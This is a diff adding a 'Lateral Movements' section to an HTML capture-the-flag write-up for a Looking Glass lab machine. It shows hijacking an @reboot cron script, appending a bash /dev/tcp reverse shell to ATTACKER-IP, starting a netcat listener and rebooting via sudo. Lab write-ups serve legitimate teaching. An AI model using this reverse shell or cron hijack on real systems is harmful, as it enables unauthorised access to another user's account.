@@ -208,8 +208,68 @@ jabberwock@looking-glass:~$
 
         <div class="wt-section" id="latmov">
             <h1> Lateral Movements </h1>
-        </div>
+            <p class="writeup-text"> Now that we are connected on the machine, let's search for user flag. The user.txt is located in the home folder : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+jabberwock@looking-glass:~$ cat user.txt
+}DETCADER{mht
+                </code>
+            </p>
+            <p class="writeup-text"> Hmm... The flag seems to be reversed. Everithing is upside down here ! Let's reverse it with python : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+jabberwock@looking-glass:~$ python3 -c 'print("}DETCADER{mht"[::-1])'
+thm{REDACTED}
+                </code>
+            </p>
+            <p class="writeup-text challenge-answer"><span> Get the user flag ? </span> Answer : thm{REDACTED} </p>
+            <p class="writeup-text"> Okay so, what's next ? Let's check the crontab file first : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+jabberwock@looking-glass:~$ cat /etc/crontab
 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
+                </code>
+            </p>
+            <p class="writeup-text"> We can see here that we have a particular cronjob. The twasBrillig.sh file is executed only when the machine reboots. It is kinda unusual to have a cronjob that runs when the machine reboots because we need root privileges to restart the machine. Let's check sudo permissions : </p>
+            <p class="writeup-text">
+                <code class="shell-response">
+jabberwock@looking-glass:~$ sudo -l
+
+Matching Defaults entries for jabberwock on looking-glass:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jabberwock may run the following commands on looking-glass:
+    (root) NOPASSWD: /sbin/reboot
+                </code>
+            </p>
+            <p class="writeup-text"> Alright, we have the right permission. Let's add our bash command to get a reverse shell inside the twasBrillig.sh file : </p>
+            <p class="writeup-text"><code> jabberwock@looking-glass:~$ echo 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1' >> twasBrillig.sh </code></p>
+            <p class="writeup-text"> Now we just have to reboot the machine, but before, let's open a connexion with netcat  : </p>
+            <p class="writeup-text"><code> $ nc -lnvp 4444 </code></p>
+            <p class="writeup-text">
+                <code class="shell-response">
+jabberwock@looking-glass:~$ sudo /sbin/reboot
+VarInt Decode
+Connection to 10.10.65.227 closed by remote host.
+                </code>
+            </p>
+        </div>
         <div class="wt-section" id="privesc">
             <h1> Privilege Escalation </h1>
             
